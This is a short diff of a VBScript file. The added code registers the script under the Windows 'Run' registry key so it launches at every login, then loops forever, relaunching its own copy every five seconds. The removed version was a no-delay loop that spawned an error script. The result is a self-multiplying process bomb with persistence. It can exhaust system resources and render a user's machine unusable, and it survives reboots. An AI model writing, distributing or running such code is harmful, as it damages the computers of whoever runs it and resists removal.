@@ -1,7 +1,17 @@
-Do
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "wscript.exe path_to_error_script.vbs", 1, False
-    
-    WScript.Sleep 0
-Loop
+Dim objShell, objFSO, scriptPath, regKey
 
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+scriptPath = objFSO.GetAbsolutePathName(WScript.ScriptFullName)
+regKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\LoopError"
+
+' Add the script path to the registry as a startup key
+objShell.RegWrite regKey, scriptPath, "REG_SZ"
+
+Do
+    objShell.Run "wscript.exe " & scriptPath, 1, False
+    
+    ' Adjust the delay time (in milliseconds) between each loop iteration
+    WScript.Sleep 5000 ' 5 seconds delay
+Loop
